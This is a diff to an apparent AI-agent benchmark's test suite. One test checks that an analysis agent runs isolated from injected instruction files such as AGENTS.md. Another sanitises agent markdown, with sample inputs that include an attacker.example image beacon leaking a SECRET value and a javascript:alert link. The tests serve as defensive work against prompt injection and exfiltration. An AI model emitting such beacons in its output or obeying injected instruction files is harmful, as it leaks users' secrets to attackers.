@@ -8628,6 +8628,37 @@ def test_why_renders_rca_report_for_base_mode():
     assert "Baseline failed on a missing dependency." in why
 
 
+def test_command_with_unknown_exit_code_is_not_failed():
+    from benchmark.harness.reports._events import command_failed
+
+    # An unresolved command (no captured exit code) is not failure evidence,
+    # even when a coarse status field says "failed".
+    assert not command_failed({"command": "codex exec ...", "exit_code": None, "status": "failed"})
+    assert command_failed({"command": "codex exec ...", "exit_code": 0, "status": "failed"})
+    assert not command_failed({"command": "codex exec ...", "exit_code": 0, "status": "completed"})
+
+
+def test_rca_codex_invoker_isolates_session_from_instruction_files(monkeypatch, tmp_path):
+    from benchmark.harness import rca
+
+    calls = []
+
+    def fake_checked_agent_run(args, cwd, input_text=None, env_prefixes=()):
+        calls.append(args)
+        return "{}"
+
+    monkeypatch.setattr(rca, "_checked_agent_run", fake_checked_agent_run)
+    rca._codex_invoker("question", tmp_path)
+
+    codex_args = calls[0]
+    # Instruction files captured into the evidence copy (AGENTS.md and
+    # friends) must not steer the investigator, and the session is pinned to
+    # the staged evidence root.
+    assert "--ignore-rules" in codex_args
+    assert "--ephemeral" in codex_args
+    assert ["--cd", str(tmp_path)] == codex_args[codex_args.index("--cd") : codex_args.index("--cd") + 2]
+
+
 def test_rca_invoker_raises_on_nonzero_agent_exit(monkeypatch):
     import io
     import subprocess
@@ -8866,11 +8897,17 @@ def test_agent_markdown_is_sanitized_and_prompt_fence_is_dynamic(tmp_path):
     assert "<pre>fenced</pre>" in sanitized  # fenced blocks untouched
 
     # A markdown image auto-fetches its URL on render — an injected beacon.
-    # It is demoted to a plain link (no leading !), so nothing loads until a
-    # human clicks and the URL stays visible.
+    # It is demoted to a plain link (no leading !) with a defanged scheme, so
+    # nothing loads, nothing is clickable, and the URL stays visible.
     beacon = sanitize_agent_markdown("look ![x](https://attacker.example/?d=SECRET) here")
     assert "![" not in beacon
-    assert "[x](https://attacker.example/?d=SECRET)" in beacon
+    assert "[x](https[:]//attacker.example/?d=SECRET)" in beacon
+    # Link targets and raw autolinks are defanged the same way, including
+    # non-fetching but executable schemes.
+    defanged = sanitize_agent_markdown("[click](javascript:alert(1)) raw https://attacker.example/leak")
+    assert "javascript:alert" not in defanged
+    assert "[click](javascript[:]alert(1))" in defanged
+    assert "https[:]//attacker.example/leak" in defanged
     # Inside a code span the image syntax is inert and left verbatim.
     assert sanitize_agent_markdown("`![x](http://a/b)`") == "`![x](http://a/b)`"
 
